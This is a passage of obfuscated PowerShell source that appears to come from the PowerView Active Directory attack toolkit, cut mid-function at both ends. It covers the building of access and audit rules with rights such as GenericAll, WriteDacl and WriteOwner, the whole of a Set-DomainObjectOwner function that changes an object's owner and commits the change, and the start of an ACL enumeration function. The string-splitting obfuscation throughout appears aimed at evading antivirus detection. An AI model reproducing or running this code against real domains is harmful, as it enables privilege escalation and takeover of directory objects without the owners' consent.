        ${CreD`enT`I`Al} =  (  &('LS')  ('v'+'ArIAblE:5R0'+'V'+'K') )."val`UE"::"Em`PtY",

        [Parameter(MANdaToRy = ${tr`Ue})]
        [ValidateSet({"{2}{0}{3}{4}{1}" -f'sSystemSe','y','Acces','cur','it'}, {"{3}{0}{2}{1}" -f 'i','d','l','CreateCh'},{"{0}{1}"-f 'Delet','e'},{"{2}{1}{3}{0}" -f 'd','eCh','Delet','il'},{"{2}{1}{0}{3}" -f'teTr','ele','D','ee'},{"{0}{2}{1}{3}{4}" -f'Ex','e','tend','d','Right'},{"{1}{2}{0}" -f 'll','Gene','ricA'},{"{4}{2}{0}{3}{1}"-f'x','ute','ricE','ec','Gene'},{"{1}{0}{2}" -f 'ene','G','ricRead'},{"{1}{0}{2}{3}" -f'er','Gen','ic','Write'},{"{1}{3}{0}{2}" -f 'hi','L','ldren','istC'},{"{2}{0}{1}"-f'istObje','ct','L'},{"{0}{2}{1}" -f'Rea','Control','d'},{"{2}{0}{1}"-f'e','adProperty','R'},{"{0}{1}"-f 'Se','lf'},{"{2}{0}{1}"-f 'yn','chronize','S'},{"{1}{0}"-f'Dacl','Write'},{"{2}{3}{0}{1}" -f 'n','er','WriteO','w'},{"{0}{1}{2}" -f 'W','ritePrope','rty'})]
        ${R`IG`Ht},

        [Parameter(maNDATORy = ${t`RuE}, pArAmEtERsEtNAmE="acCessrU`L`Etype")]
        [ValidateSet({"{0}{1}" -f 'A','llow'}, {"{0}{1}"-f'De','ny'})]
        [String[]]
        ${A`CCESsCOn`TRoLTY`pe},

        [Parameter(mANdAToRY = ${T`RUe}, ParAMEteRsetNAME="AUDiT`RU`let`ypE")]
        [ValidateSet({"{0}{1}{2}" -f'Suc','ce','ss'}, {"{2}{1}{0}"-f 're','ailu','F'})]
        [String]
        ${AUdi`TFL`AG},

        [Parameter(MaNdAtOry = ${fA`l`sE}, ParamEteRSeTnaME="a`ccESS`RuLE`TYPe")]
        [Parameter(MAndATORy = ${FA`L`SE}, paRAmeTersetnaME="AU`DITr`U`LeTYpE")]
        [Parameter(MaNdaToRY = ${FA`l`sE}, pArametErSEtNAmE="OBJecT`G`UIDL`OOkUp")]
        [Guid]
        ${ObJE`C`TTYPE},

        [ValidateSet('All', {"{2}{0}{1}"-f 'e','n','Childr'},{"{2}{0}{1}{3}"-f'cend','en','Des','ts'},{"{1}{0}" -f 'one','N'},{"{1}{3}{4}{0}{2}" -f 'l','SelfA','dren','ndC','hi'})]
        [String]
        ${i`NHERITA`N`cETYpe},

        [Guid]
        ${inhEr`i`TEd`obJ`ectTYpE}
    )

    Begin {
        if (${Pri`N`CIpAL`ID`eNtiTy} -notmatch ("{1}{0}{2}" -f '1-.','^S-','*')) {
            ${pRinC`I`pALSEarchE`R`A`Rg`UMen`TS} = @{
                ("{2}{0}{1}" -f't','y','Identi') = ${Pr`iN`cipAliden`T`ITy}
                ("{0}{1}{2}"-f'Pro','p','erties') = ("{6}{0}{2}{3}{4}{1}{5}" -f'inguishedn','si','ame',',objec','t','d','dist')
            }
            if (${P`SbOUND`pA`RAmE`TERS}[("{1}{2}{4}{3}{0}" -f'n','Prin','cipalDo','i','ma')]) { ${Pr`I`NciPAl`SeArC`HERAr`GU`mEN`Ts}[("{0}{1}" -f'Do','main')] = ${pRincip`A`lD`Oma`IN} }
            if (${ps`B`oUND`PAR`AMEtErS}[("{0}{1}"-f 'Se','rver')]) { ${Pri`Nc`IPaLSearcH`ERAr`gumE`NtS}[("{2}{0}{1}" -f'rve','r','Se')] = ${S`ErvEr} }
            if (${P`Sb`ou`NDPA`RAMEtE`RS}[("{0}{1}{2}"-f'Se','ar','chScope')]) { ${PriN`cip`AlseArCHERargU`Me`Nts}[("{2}{3}{0}{1}" -f'op','e','Searc','hSc')] = ${seAR`chS`c`OPE} }
            if (${PS`Bo`Und`PARAM`eTERs}[("{2}{1}{0}" -f 'eSize','tPag','Resul')]) { ${pR`IncIpaLsE`Ar`cHE`R`Arg`U`Me`Nts}[("{4}{1}{0}{2}{3}"-f 't','l','Page','Size','Resu')] = ${RE`SultPA`G`ESI`ZE} }
            if (${pSB`OUnDPa`RamET`E`Rs}[("{2}{1}{0}"-f 'verTimeLimit','er','S')]) { ${PRincI`p`AlseARChER`ArGUMeN`Ts}[("{1}{0}{2}{3}"-f 'i','ServerT','m','eLimit')] = ${seR`VerTI`m`ELimit} }
            if (${P`sboUND`P`AR`AmeTerS}[("{1}{2}{0}" -f 'bstone','T','om')]) { ${PRI`NCipaL`sEArC`heR`ARg`UME`Nts}[("{1}{0}{2}" -f'b','Tom','stone')] = ${tOMBs`T`one} }
            if (${PsB`OUNdPAR`Amet`Ers}[("{0}{1}{2}" -f'C','reden','tial')]) { ${PRI`N`CIPalSE`ARch`eRa`RGumen`Ts}[("{2}{3}{1}{0}" -f 'ntial','de','C','re')] = ${C`ReD`EnTiAL} }
            ${p`RIN`ci`PAL} = &("{2}{1}{3}{0}" -f 'nObject','m','Get-Do','ai') @PrincipalSearcherArguments
            if (-not ${PriN`CI`Pal}) {
                throw ('U'+'na'+'ble '+'to'+' '+'re'+'solv'+'e '+'p'+'rinci'+'pal: '+"$PrincipalIdentity")
            }
            elseif(${pRi`NCiP`Al}."c`ount" -gt 1) {
                throw ("{0}{7}{8}{10}{6}{4}{2}{9}{3}{1}{5}"-f'PrincipalIdent',' i','ti','t only one','ul','s allowed','ches m','i','ty','ple AD objects, bu',' mat')
            }
            ${o`BJeC`T`sid} = ${p`RI`NcIPAl}."Ob`jEC`TsId"
        }
        else {
            ${o`BjE`cTsId} = ${princIPaLi`de`N`Tity}
        }

        ${Adr`I`GHT} = 0
        foreach(${R} in ${RIg`HT}) {
            ${A`dRI`gHT} = ${aDr`ig`ht} -bor (([System.DirectoryServices.ActiveDirectoryRights]${r})."v`Alue__")
        }
        ${a`DRIG`HT} = [System.DirectoryServices.ActiveDirectoryRights]${ADrI`ght}

        ${IdENT`ity} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${O`BJEc`TsId})
    }

    Process {
        if(${PSCm`D`L`Et}.parAMeteRSetNAmE -eq ("{0}{2}{3}{1}" -f 'A','e','ud','itRuleTyp')) {

            if(${oBJECTT`Y`Pe} -eq ${Nu`lL} -and ${i`NHE`RitA`NcET`ype} -eq   (&("{2}{0}{1}"-f'ABl','e','vaRi') ("{1}{0}"-f 'y','q1') -VaL )::"eM`ptY" -and ${INheR`I`T`EdOBj`ecTtyPE} -eq ${N`Ull}) {
                &("{2}{0}{1}"-f'c','t','New-Obje') ("{8}{2}{10}{4}{1}{7}{9}{3}{6}{5}{0}"-f 'e','vi','.Dir','ud','orySer','ul','itR','ces.Ac','System','tiveDirectoryA','ect') -ArgumentList ${i`d`ENTITY}, ${a`D`RiGHt}, ${AUDit`F`lAg}
            } elseif(${O`B`JeCTTYPe} -eq ${n`Ull} -and ${In`H`ErI`T`ANCE`TYPE} -ne   ${Q`1Y}::"EMP`TY" -and ${inHER`iT`E`DobJ`EctTypE} -eq ${n`UlL}) {
                &("{2}{0}{1}" -f 'jec','t','New-Ob') ("{3}{2}{4}{1}{0}{6}{7}{5}"-f 'ices.','yServ','t','System.Direc','or','Rule','ActiveDirec','toryAudit') -ArgumentList ${I`den`Tity}, ${A`drIGhT}, ${AuDi`T`FlAG}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${In`He`RITAncETYPE})
            } elseif(${O`BjecT`Ty`Pe} -eq ${N`Ull} -and ${iNheRIta`NceT`ypE} -ne  ${Q`1Y}::"emp`TY" -and ${iNh`er`iTed`O`BJEC`T`TYPE} -ne ${n`ULL}) {
                &("{0}{2}{3}{1}"-f'Ne','Object','w','-') ("{1}{0}{2}{4}{10}{5}{6}{8}{7}{9}{3}"-f 'tem.','Sys','D','le','i','toryServ','ices.Ac','ector','tiveDir','yAuditRu','rec') -ArgumentList ${IDEnT`i`TY}, ${A`DRIGHt}, ${A`U`DiTFL`AG}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${INHER`i`Ta`NcEtY`Pe}), ${I`N`He`Rit`edobJECttYPE}
            } elseif(${o`BJeCtTY`PE} -ne ${nU`ll} -and ${i`N`HerI`TaNC`etyPE} -eq  (&("{1}{0}" -f'R','di')  ('vARiaB'+'l'+'E:Q1y'))."Val`Ue"::"E`mptY" -and ${inHer`I`TEdOBjectT`Y`Pe} -eq ${NU`Ll}) {
                &("{2}{1}{0}"-f'ect','-Obj','New') ("{7}{4}{6}{9}{8}{3}{2}{0}{1}{5}" -f 'or','yAud','ect','ctiveDir','Di','itRule','rectoryS','System.','ices.A','erv') -ArgumentList ${i`DeNti`Ty}, ${aD`R`IGht}, ${AuD`it`F`lag}, ${O`BJeCtT`Y`pE}
            } elseif(${Ob`JE`cT`TYPe} -ne ${n`Ull} -and ${inhEri`T`AnCet`YpE} -ne   (  &("{2}{3}{1}{0}" -f 'iAbLe','R','GeT-V','A')  ("{0}{1}"-f 'Q1','y') )."Va`lue"::"eM`PtY" -and ${I`Nhe`RIt`E`DobJEcTTY`pe} -eq ${n`Ull}) {
                &("{3}{1}{0}{2}" -f'e','j','ct','New-Ob') ("{5}{7}{2}{3}{1}{8}{10}{9}{6}{0}{11}{4}" -f 'u','er','.Direc','toryS','le','S','yA','ystem','vice','iveDirector','s.Act','ditRu') -ArgumentList ${IdE`NTItY}, ${A`dRIg`Ht}, ${a`UDiTFL`Ag}, ${obj`ECTtY`Pe}, ${In`H`E`RItAnc`Et`YpE}
            } elseif(${oB`jECTT`y`Pe} -ne ${N`Ull} -and ${InHe`RiTaNc`et`ypE} -ne  ${q`1Y}::"eMP`Ty" -and ${iNH`E`Rite`DObje`cttY`pe} -ne ${n`ULl}) {
                &("{0}{2}{1}{3}"-f 'N','Objec','ew-','t') ("{2}{6}{3}{1}{0}{4}{7}{5}{8}{9}" -f 'ActiveDi','toryServices.','Sys','Direc','re','oryAudit','tem.','ct','Ru','le') -ArgumentList ${idE`NtIty}, ${ADr`IG`ht}, ${auDi`Tf`lag}, ${Ob`je`cTTY`pe}, ${IN`Herit`A`N`ce`TYpe}, ${I`Nhe`RI`T`edOBjEcTtYPE}
            }

        }
        else {

            if(${ObJ`eCtT`ypE} -eq ${NU`LL} -and ${i`NheRITa`N`cetY`PE} -eq  (  &('Gi') ("{2}{3}{0}{1}" -f 'q1','Y','VaRiab','le:') )."Va`lUe"::"emP`Ty" -and ${iNHe`R`ItEd`o`B`jECTtYpE} -eq ${Nu`ll}) {
                &("{1}{2}{0}"-f 'bject','New','-O') ("{1}{12}{4}{0}{2}{8}{11}{9}{10}{5}{6}{7}{3}" -f 'toryS','Sy','e','le','.Direc','e','cto','ryAccessRu','r','e','s.ActiveDir','vic','stem') -ArgumentList ${iD`EN`TITY}, ${aD`RiG`ht}, ${ac`cESs`conTr`OltyPE}
            } elseif(${ObjE`CTtY`pe} -eq ${Nu`ll} -and ${in`her`ita`N`CeTYpe} -ne  (  &("{0}{1}" -f'VAriAb','LE')  ('q1'+'y')  )."vAl`UE"::"em`pty" -and ${INHeRI`TEDob`jeCt`T`Y`Pe} -eq ${N`ULl}) {
                &("{0}{2}{1}"-f 'New-O','t','bjec') ("{1}{4}{8}{11}{12}{6}{3}{9}{0}{5}{2}{7}{10}" -f'.ActiveDire','S','yAccess','vi','ystem.','ctor','Ser','Ru','Dir','ces','le','ec','tory') -ArgumentList ${idENtI`TY}, ${AD`RI`GHt}, ${ac`CEssC`o`NTROl`TypE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${INHERit`An`c`ETyPe})
            } elseif(${OBJ`ect`TYpe} -eq ${Nu`lL} -and ${inh`er`ita`Ncetype} -ne   ( &("{2}{0}{1}{3}" -f'T-','vARi','GE','AblE')  ("q"+"1Y") )."vAL`UE"::"eMp`TY" -and ${i`Nher`iTED`o`BjecttY`Pe} -ne ${N`UlL}) {
                &("{1}{0}{2}" -f 'ew-O','N','bject') ("{9}{13}{11}{5}{4}{12}{14}{1}{10}{7}{2}{0}{6}{3}{8}" -f 'toryA','t','ec','ssRu','ct','ire','cce','r','le','Sys','iveDi','.D','oryServices.','tem','Ac') -ArgumentList ${ideNTi`TY}, ${AD`RIght}, ${a`C`CEss`COnTroLTY`pE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${I`Nh`eriTA`NcetyPE}), ${inHEr`I`TEdOBjeC`Tt`y`pE}
            } elseif(${O`BjeC`Tty`pE} -ne ${NU`Ll} -and ${i`N`HEriT`ANcEt`YPe} -eq   ${q`1y}::"E`MPTY" -and ${IN`heRit`Ed`oBJec`T`Ty`pe} -eq ${N`Ull}) {
                &("{0}{2}{1}"-f'New-O','t','bjec') ("{2}{5}{3}{1}{12}{6}{8}{9}{4}{10}{7}{0}{11}" -f'sRul','ectorySer','Sy','tem.Dir','toryAcc','s','ctiv','s','eD','irec','e','e','vices.A') -ArgumentList ${id`Enti`TY}, ${ADR`Ig`Ht}, ${aC`ce`s`sco`N`TroLTYPE}, ${OBJe`c`TT`yPE}
            } elseif(${obJEC`TTy`pe} -ne ${N`ULl} -and ${INhEri`TA`N`CetY`PE} -ne  (&("{1}{2}{0}" -f'LE','vAri','aB') ("Q"+"1Y") -VAlu  )::"EMp`Ty" -and ${iNh`ErI`Tedo`Bj`eCtt`y`Pe} -eq ${nU`lL}) {
                &("{2}{1}{0}"-f 't','w-Objec','Ne') ("{0}{3}{2}{10}{1}{8}{9}{4}{6}{5}{11}{7}" -f'Sy','er','Director','stem.','ctiv','Acce','eDirectory','sRule','vices.','A','yS','s') -ArgumentList ${iDe`NTi`TY}, ${Adri`g`HT}, ${ACc`ESscONt`R`OLtYpE}, ${ObjE`C`TTYpE}, ${IN`HeritaNC`etYpe}
            } elseif(${obj`EcTt`YPE} -ne ${nu`ll} -and ${iNHe`R`ITance`TY`pE} -ne   (&("{1}{0}" -f 'ir','D')  ("{0}{2}{3}{1}"-f 'VAr','Q1Y','ia','BlE:'))."v`ALUE"::"E`MPtY" -and ${inHeRiT`e`DO`BJ`e`CT`TYpE} -ne ${n`ULL}) {
                &("{0}{2}{1}" -f'New-O','ect','bj') ("{2}{11}{5}{0}{13}{3}{1}{4}{7}{8}{9}{10}{12}{6}{14}" -f'ire','vices.Act','Sy','Ser','iveD','m.D','l','ir','ector','yAcc','ess','ste','Ru','ctory','e') -ArgumentList ${iDEn`Ti`Ty}, ${ADRi`GHT}, ${ACc`ESsc`o`N`TroLTYPe}, ${ObJ`ecTTY`Pe}, ${Inh`ERiT`A`N`cetYPe}, ${In`HeRI`TEdOB`JeCTTYPE}
            }

        }
    }
}


function s`Et`-DOma`iNOb`jecTow`NEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{7}{1}{8}{5}{0}{2}{4}{6}"-f 'orSt','h','ateCha','PSU','ngingFu','uldProcessF','nctions','seS','o'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}" -f 'Process','SSh','ould','P'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(posItIoN = 0, MAnDatORy = ${tr`Ue}, VALueFroMpIpELinE = ${t`RUE}, ValuEFRompiPELINebypROpeRTYNaMe = ${t`RuE})]
        [Alias({"{1}{2}{3}{4}{0}"-f 'uishedName','D','i','sti','ng'}, {"{2}{0}{1}"-f 'amAccountN','ame','S'}, {"{0}{1}" -f 'Na','me'})]
        [String]
        ${id`e`NTity},

        [Parameter(maNdAtoRY = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'er','Own'})]
        [String]
        ${o`wNeRIDEnt`I`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`MaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'r','Filte'})]
        [String]
        ${l`dApFilt`er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'Path','DS','A'})]
        [String]
        ${SEARC`h`B`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{4}{0}"-f 'ller','Contr','Do','main','o'})]
        [String]
        ${Se`R`VEr},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{0}{1}{2}"-f 'OneLev','e','l'}, {"{2}{0}{1}"-f'r','ee','Subt'})]
        [String]
        ${Sea`RCh`Sco`PE} = ("{1}{0}"-f 'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rES`Ul`Tp`AGesIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`R`VErTimELI`M`It},

        [Switch]
        ${T`O`mBSTONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eDEN`Ti`AL} =  (&("{0}{2}{1}" -f 'Va','BLe','ria') ("{1}{0}" -f '0vK','5R') -Va )::"E`MPTy"
    )

    BEGIN {
        ${SE`ARch`E`RARgU`MeN`Ts} = @{}
        if (${P`Sb`OuN`dparAme`TeRs}[("{0}{1}{2}" -f 'D','o','main')]) { ${seaRcHE`R`A`Rg`UmenTs}[("{2}{0}{1}"-f'ai','n','Dom')] = ${d`OmaIN} }
        if (${psB`o`U`NDParAm`e`TErs}[("{1}{2}{0}" -f'r','LDAP','Filte')]) { ${seA`RcHE`R`ARGu`meNTS}[("{0}{2}{1}"-f'LD','ter','APFil')] = ${l`dAPfil`TER} }
        if (${PSbO`UNDp`AR`A`MetErs}[("{2}{1}{0}" -f'se','Ba','Search')]) { ${S`earc`He`RArgUmenTs}[("{2}{0}{1}" -f 'ar','chBase','Se')] = ${sE`ArCH`BA`Se} }
        if (${pS`BOUn`d`p`ArAME`TERS}[("{1}{0}" -f'ver','Ser')]) { ${SEar`CHErA`Rg`U`MeNTS}[("{2}{1}{0}"-f'rver','e','S')] = ${sE`RVER} }
        if (${pSb`OUNdParA`Me`TERS}[("{3}{1}{0}{2}" -f'o','archSc','pe','Se')]) { ${SeA`RCHe`RA`RguMEntS}[("{2}{0}{3}{1}"-f'rchSco','e','Sea','p')] = ${seaR`CH`Sc`Ope} }
        if (${Ps`BoUndParAm`e`T`ERs}[("{2}{3}{0}{1}" -f'eSiz','e','Result','Pag')]) { ${SEAr`C`HeraRg`U`ME`NTS}[("{4}{2}{0}{1}{3}"-f'ltPa','geSiz','u','e','Res')] = ${r`ESulTpAG`es`iZE} }
        if (${pS`BoundPAR`Amet`ErS}[("{3}{2}{1}{4}{0}"-f 'mit','imeL','verT','Ser','i')]) { ${Se`Ar`cHeRArg`UmENTs}[("{3}{4}{0}{2}{1}"-f 'rT','t','imeLimi','Ser','ve')] = ${seRve`R`TImElimIt} }
        if (${Ps`BOUNd`paR`A`MEtERS}[("{2}{1}{0}" -f 'ne','mbsto','To')]) { ${se`Ar`Che`R`AR`GuMeNTS}[("{0}{1}{3}{2}"-f'To','mbs','e','ton')] = ${t`oM`BStoNE} }
        if (${PSbO`UNDpARam`Ete`RS}[("{2}{1}{0}" -f 'l','dentia','Cre')]) { ${seaRcherArG`U`me`NTS}[("{2}{1}{0}" -f 'ial','t','Creden')] = ${c`R`eD`ENTIAl} }

        ${O`WnERs`id} = &("{3}{1}{4}{2}{0}" -f 't','e','jec','G','t-DomainOb') @SearcherArguments -Identity ${oWNE`R`IDEn`TITY} -Properties ("{0}{1}{2}" -f 'o','b','jectsid') | &("{0}{2}{1}{3}" -f'Se','ec','lect-Obj','t') -ExpandProperty ("{1}{2}{0}" -f 'tsid','obje','c')
        if (${ow`NERS`iD}) {
            ${O`wn`ERIdEN`TI`TYr`eFeReNcE} = [System.Security.Principal.SecurityIdentifier]${o`WNE`RsId}
        }
        else {
            &("{0}{3}{4}{1}{2}" -f 'Wr','i','ng','ite-Wa','rn') ('['+'Set-Dom'+'ainObj'+'e'+'ctOwne'+'r] '+'Err'+'or '+'p'+'ar'+'sing '+'o'+'wner '+'ide'+'ntity '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if (${O`WNErI`dENtIt`yreFerEn`Ce}) {
            ${s`EARcH`ErA`Rg`UMEnts}['Raw'] = ${T`Rue}
            ${Sear`c`her`AR`G`UmenTs}[("{2}{0}{1}"-f 'de','ntity','I')] = ${i`d`eNt`ItY}

            
            ${R`Awo`BjECt} = &("{2}{3}{1}{0}"-f't','c','Get-DomainObj','e') @SearcherArguments

            ForEach (${O`B`JEct} in ${raWo`BjE`cT}) {
                try {
                    &("{2}{1}{0}{3}"-f 'te','ri','W','-Verbose') ('[Set-Dom'+'ainOb'+'jec'+'tO'+'wn'+'er]'+' '+'At'+'te'+'mpt'+'ing '+'t'+'o '+'s'+'et '+'th'+'e '+'own'+'er '+'for'+' '+"'$Identity' "+'t'+'o '+"'$OwnerIdentity'")
                    ${e`Nt`RY} = ${raw`ObJ`EcT}.("{0}{1}{2}{3}" -f 'Ge','tDi','rect','oryEntry').Invoke()
                    ${En`T`RY}."psba`sE"."OPTiO`NS"."sec`URI`TyM`AskS" = ("{0}{1}"-f 'O','wner')
                    ${e`NT`Ry}."P`sba`SE"."OB`J`Ec`TsEcURiTy".("{0}{1}"-f'SetOwn','er').Invoke(${ow`N`EriDENtiTy`Re`FErENCe})
                    ${en`Try}."Ps`Base".("{2}{1}{3}{0}"-f 's','ommitChang','C','e').Invoke()
                }
                catch {
                    &("{0}{1}{2}"-f 'Wr','ite-','Warning') ('[S'+'et-Dom'+'ain'+'ObjectOwn'+'e'+'r]'+' '+'Erro'+'r '+'s'+'etting'+' '+'ow'+'n'+'er: '+"$_")
                }
            }
        }
    }
}


function Ge`T-d`OMAi`NObJEctAcL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}{4}"-f 'P','SSh','es','ouldProc','s'}, '')]
    [OutputType({"{3}{1}{0}{2}" -f'ie','werV','w.ACL','Po'})]
    [CmdletBinding()]
    Param (
        [Parameter(poSItIon = 0, vALUefROMPIpeLiNe = ${t`RuE}, vAlueFrOmPiPeLineBYpRoPeRTynAMe = ${T`RUe})]
        [Alias({"{0}{3}{2}{1}"-f 'D','dName','e','istinguish'}, {"{0}{1}{3}{4}{2}" -f'SamA','cco','e','untNa','m'}, {"{1}{0}" -f'ame','N'})]
        [String[]]
        ${i`deN`TI`TY},

        [Switch]
        ${Sa`cL},

        [Switch]
        ${R`ESoLVEGUI`ds},

        [String]
        [Alias({"{0}{1}" -f'R','ights'})]
        [ValidateSet('All', {"{1}{2}{0}"-f'rd','ResetPa','sswo'}, {"{3}{1}{2}{0}"-f'bers','M','em','Write'})]
        ${Ri`Gh`Tsf`ILT`er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Fil','r','te'})]
        [String]
        ${LD`APfiLt`eR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'A','DSPath'})]
        [String]
        ${SEar`C`h`BAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{1}{3}{2}"-f 'Con','tr','ler','ol','Domain'})]
        [String]
        ${serV`Er},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{0}{2}{1}"-f'O','eLevel','n'}, {"{1}{0}"-f 'ubtree','S'})]
        [String]
        ${s`ear`CH`ScOPe} = ("{0}{1}" -f 'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`sUlTP`A`GE`sIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`RvER`TI`mEliMiT},

        [Switch]
        ${T`oMbsT`o`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`edE`NT`IaL} =  (&("{2}{1}{0}" -f'iAble','-Var','geT')  ("{0}{1}" -f '5','r0vk')  -VaLUeo )::"em`Pty"
    )

    BEGIN {
        ${sEar`ChE`RarG`UMen`TS} = @{
            ("{0}{3}{2}{1}" -f 'P','rties','ope','r') = ("{1}{8}{6}{4}{3}{14}{12}{13}{0}{7}{11}{9}{10}{2}{5}"-f 'dis','sam','ob','t','ri','jectsid','ntname,ntsecu','tin','accou','shed','name,','gui','escript','or,','yd')
        }

        if (${Ps`B`OUn`DpARamET`E`Rs}[("{0}{1}" -f'Sac','l')]) {
            ${SeAr`Ch`eRa`RGuMEnTs}[("{3}{2}{0}{1}"-f 'rity','Masks','ecu','S')] = ("{1}{0}"-f 'acl','S')
        }
        else {
            ${SEA`RCh`erarGuMe`NTs}[("{3}{2}{4}{0}{1}" -f 'ityMa','sks','c','Se','ur')] = ("{0}{1}" -f'D','acl')
        }
        if (${PSboU`N`d`paR`AM`EteRS}[("{1}{0}{2}" -f 'om','D','ain')]) { ${sEAr`CHer`AR`gU`MEn`TS}[("{1}{0}" -f 'n','Domai')] = ${dom`A`iN} }
        if (${PSB`Ou`NDP`Ar`A`meters}[("{3}{2}{0}{1}"-f 'h','Base','rc','Sea')]) { ${SE`ARCh`e`RaR`GUMents}[("{1}{2}{0}" -f'ase','Searc','hB')] = ${SEARC`HB`Ase} }
        if (${PSBo`UnD`pArA`m`ETErS}[("{0}{1}"-f'Serve','r')]) { ${SEaRcHE`R`ARguMEn`Ts}[("{0}{1}"-f'Se','rver')] = ${s`er`VeR} }
        if (${Ps`BoUNdP`Ar`A`METeRs}[("{3}{0}{1}{2}"-f 'c','o','pe','SearchS')]) { ${Sea`R`cHE`Ra`RgUMEn`TS}[("{1}{0}{2}" -f 'rchS','Sea','cope')] = ${SEarch`sc`o`pE} }
        if (${p`sboUNd`parA`mEterS}[("{0}{2}{3}{1}"-f 'R','ize','esultP','ageS')]) { ${SeaRcH`E`RargU`Men`TS}[("{3}{2}{1}{0}{4}" -f'eS','g','esultPa','R','ize')] = ${r`EsU`LTpaGEs`IZE} }
        if (${PsboU`NDpARA`M`E`Ters}[("{0}{3}{2}{4}{1}" -f'Ser','imit','ime','verT','L')]) { ${sEA`RCH`erA`R`GU`mEnTS}[("{1}{4}{0}{2}{3}" -f'erTim','S','eLimi','t','erv')] = ${S`e`Rv`eRTIMELi`MIT} }
        if (${pS`BoUNDP`Ara`met`eRs}[("{2}{0}{1}" -f'ombston','e','T')]) { ${SEar`c`HE`RArGUm`En`TS}[("{1}{2}{0}" -f 'ne','Tombs','to')] = ${To`MbS`TOnE} }
        if (${PsbOuND`paRaM`e`T`ERs}[("{0}{2}{1}"-f 'C','ntial','rede')]) { ${SEa`RCH`e`R`A`RGuMENtS}[("{2}{1}{0}" -f'l','ia','Credent')] = ${C`Re`DENTiaL} }
        ${SearC`Her} = &("{0}{2}{3}{1}{4}" -f 'G','Sear','et-Do','main','cher') @SearcherArguments

        ${DOMaIN`GUID`MaP`AR`gu`m`ENTS} = @{}
        if (${psbOu`NDPAra`ME`Te`RS}[("{1}{0}" -f 'ain','Dom')]) { ${DOm`Ain`gu`i`DMaPArGU`Me`NTS}[("{0}{1}" -f 'Do','main')] = ${D`OMA`iN} }
        if (${Ps`BOun`D`P`ArAM`eters}[("{1}{2}{0}" -f 'r','Serv','e')]) { ${d`oM`A`iNG`UiDM`APARGUMENtS}[("{0}{1}"-f'S','erver')] = ${S`eRv`ER} }
        if (${PSBO`Undp`ARaMEte`Rs}[("{1}{0}{3}{2}" -f'esult','R','ageSize','P')]) { ${doMaIn`G`U`iD`mapa`Rgum`Ents}[("{2}{3}{1}{4}{0}"-f 'ze','ltPageS','Res','u','i')] = ${Re`SUlT`PAGE`sI`ze} }
        if (${psBOU`Nd`par`A`mETE`Rs}[("{1}{0}{2}{3}{4}" -f'rve','Se','r','TimeLim','it')]) { ${d`oM`AingUIDMaPArgUME`NtS}[("{1}{0}{2}"-f'e','ServerTim','Limit')] = ${sE`RveR`TIMElI`MIT} }
        if (${p`s`BOu`NdPaRAmEt`eRs}[("{1}{0}{2}" -f'r','C','edential')]) { ${doMainG`Ui`Dm`AP`Ar`Gum`EnTs}[("{0}{2}{1}" -f'Cr','ntial','ede')] = ${cr`e`dEnTIAl} }

        
        if (${PSB`OUnDP`ARam`Ete`Rs}[("{1}{3}{2}{0}" -f's','Reso','GUID','lve')]) {
            ${Gu`IdS} = &("{5}{4}{0}{2}{1}{3}" -f'm','i','a','nGUIDMap','t-Do','Ge') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${s`EAR`C`her}) {
            ${IdEnTIt`y`F`i`lTeR} = ''
            ${F`ilter} = ''
            ${i`dENT`Ity} | &("{1}{2}{0}" -f'ject','Whe','re-Ob') {${_}} | &("{0}{3}{1}{2}{4}"-f'For','-Ob','jec','Each','t') {
                ${Ide`NtiTy`iNsT`AncE} = ${_}.("{0}{1}"-f 'Replac','e').Invoke('(', '\28').("{2}{1}{0}"-f 'ce','a','Repl').Invoke(')', '\29')
                if (${Id`e`Ntit`YI`NSTance} -match ("{0}{1}"-f '^S-1','-.*')) {
                    ${iD`ENt`iTy`Fi`lTeR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${i`de`NTItYi`NSTA`NCe} -match ((("{0}{2}{3}{1}"-f '^','.*','(CNvowOU','vowDC)=')) -REplACE([chAr]118+[chAr]111+[chAr]119),[chAr]124)) {
                    ${iDE`NTi`Ty`FiLT`eR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${ps`BOUNd`p`ArAmeTers}[("{0}{2}{1}" -f'Doma','n','i')]) -and (-not ${PSboUnd`paramE`T`eRS}[("{2}{0}{1}" -f'ar','chBase','Se')])) {
                        
                        
                        ${IDE`NtI`TYDoMaIn} = ${idEnt`Ityi`NSt`A`N`Ce}.("{0}{1}" -f 'SubStr','ing').Invoke(${i`dENtITy`i`NsTaN`Ce}.("{1}{2}{0}"-f'exOf','In','d').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
